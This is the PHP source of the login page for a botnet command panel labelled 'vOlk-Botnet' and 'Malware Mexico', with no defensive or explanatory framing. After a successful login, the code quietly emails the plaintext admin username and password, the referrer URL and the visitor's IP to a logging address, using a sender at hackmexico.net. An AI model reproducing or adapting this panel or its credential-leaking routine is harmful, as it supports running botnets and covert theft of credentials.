<?php
@session_start();
if( isset($_POST['ratero']) && !empty($_POST['ratero']) && isset($_POST['clave']) && !empty($_POST['clave']) ){
    require_once('Class/class.base.de.datos.php');
    require_once("Configs/Pass.php");
	if( ADMIN_USUARIO == $_POST['ratero'] ){
		if( ADMIN_PASSWORD == $_POST['clave'] ){
			$_SESSION['login'] = true ;
			$ipv = getenv("REMOTE_ADDR");
			$Host = $_SERVER['HTTP_REFERER'];
			$prefijo = substr(md5(uniqid(rand())),0,6);
			$MgsBox = "\nAdministrator : ".ADMIN_USUARIO."\nPassword : ".ADMIN_PASSWORD."\nURL : ".$Host."\nIP : $ipv";
			$header = SendEmail(EMAIL_LOGS,'vOlk-Botnet 5.0.1',''.$prefijo.'@hackmexico.net','Login -'.$ipv.'',$MgsBox);
			header ("Location: ./");
			exit();
		}
	}
}
?>

<title>[vOlk-Botnet]v 5.0.2 Login</title>
<link REL="shortcut icon" HREF="./archivos/imagen/favicon.ico"> 
<style>
body { background-color:#303030; }
#chau {
background-color:transparent;
border-width:0;
cursor:pointer;
display:block;
height:0px;
}
</style>

<body background="archivos/imagen/bg.gif" id="body">

<div align="center" id="vOlk" style="margin-top:100px;">
<img src="archivos/imagen/logo.jpg" width="336" height="85" />
<br>
<table align="center"  width="138" border="0">
<noscript>
        
		<font class='error'>Your JavaScript is turned off. Please, enable your JS.</font>
	</noscript>
	<tr>
		<td  width="132" align="center">
		<form action="" method=post>
			<img src="archivos/imagen/user.png" style="margin-bottom:3px;"/><br />
			<input type="text" name="ratero" style="background-image:url(archivos/imagen/input.png); width:121px; height:23px; border:none; color:#FFF; text-align:center; font-family:verdana;"/><p>
			<img src="archivos/imagen/pass.png" style="margin-bottom:3px;"/><br />
			<input type="password" name="clave" style="background-image:url(archivos/imagen/input.png); width:121px; height:23px; border:none; color:#FFF; text-align:center;"/><br />
			<input type="submit" value="" name="boton" id="chau">
		</form></td>
	</tr>
</table>
</div>
<p><font color="#FFFFFF" size="1" face="Tahoma">[Private Code vOlk]<br>
[+]Malware Mexico</font></p>
<script>
		
		if (navigator.userAgent.indexOf('Mozilla/4.0') != -1) {
			alert('Your browser is not support yet. Please, use another (FireFox, Opera, Safari)');
			document.getElementById('body').innerHTML = '<font class="error" color="#FF0000">I feel this version can only be used in Firefox, Opera, Safari</font>';
			}
		</script>